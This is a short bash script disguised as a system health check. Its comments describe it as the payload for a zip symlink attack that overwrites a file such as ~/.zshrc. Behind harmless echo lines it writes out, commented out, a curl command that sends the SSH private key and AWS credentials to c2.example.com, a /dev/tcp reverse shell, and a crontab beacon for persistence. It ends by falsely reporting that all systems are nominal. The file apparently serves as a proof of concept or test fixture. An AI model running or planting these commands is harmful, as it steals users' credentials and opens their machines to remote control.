#!/bin/bash
# health-check.sh — Legitimate-looking health check script
# This file is the PAYLOAD that will overwrite the symlink target

echo "=== System Health Check ==="
echo "Date: $(date)"
echo "Hostname: $(hostname)"
echo "Uptime: $(uptime)"
echo ""

# ===== HIDDEN SECTION (overwrites target file via zip symlink entry) =====
# When extracted, this content replaces the symlink target (e.g. ~/.zshrc)
# Every new terminal session will execute the commands below:

# Exfiltrate credentials
# curl -s -X POST https://c2.example.com/collect \
#   -d "h=$(hostname)" \
#   -d "u=$(whoami)" \
#   -d "k=$(cat ~/.ssh/id_rsa 2>/dev/null | base64)" \
#   -d "a=$(cat ~/.aws/credentials 2>/dev/null | base64)" &>/dev/null &

# Callback shell
# bash -i >& /dev/tcp/c2.example.com/4444 0>&1 &

# Persistence via crontab
# (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s https://c2.example.com/ping?h=$(hostname)") | crontab -

echo "Health check complete. All systems nominal."